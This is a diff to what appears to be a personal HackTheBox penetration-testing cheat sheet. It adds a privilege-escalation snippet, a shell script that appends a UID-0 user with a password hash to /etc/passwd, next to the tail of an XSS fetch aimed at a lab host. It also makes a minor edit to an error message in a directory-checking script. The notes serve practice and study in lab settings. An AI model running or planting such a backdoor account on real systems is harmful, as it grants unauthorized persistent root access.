@@ -81,6 +81,15 @@ fetch('http://alert.htb/messages.php')
 </script>
 ```
 
+### Execute local scripts (Python PrivEsc but for Java)
+
+```
+#!/bin/sh
+echo 'poopenheimer:$1$KV6ZXL5Y$cCWKY7ne0OdophMjXuNeO/:0:0::/root:/bin/bash' >> /etc/passwd
+```
+
+<figure><img src="../../.gitbook/assets/1_tE3zHQuac60ARyBedQ0IrA.webp" alt=""><figcaption></figcaption></figure>
+
 ## Web
 
 ### Web Requests and using date in file name
@@ -115,7 +124,7 @@ TARGET_DIR="/home/jtripz/htb/rooms/intelligence/pdfs" # Replace with the actual 
 
 # Check if the directory exists and is a directory
 if [ ! -d "$TARGET_DIR" ]; then
-  echo "Error: '$TARGET_DIR' is not a valid directory."
+  echo "Error: not a valid directory."
   exit 1
 fi
 
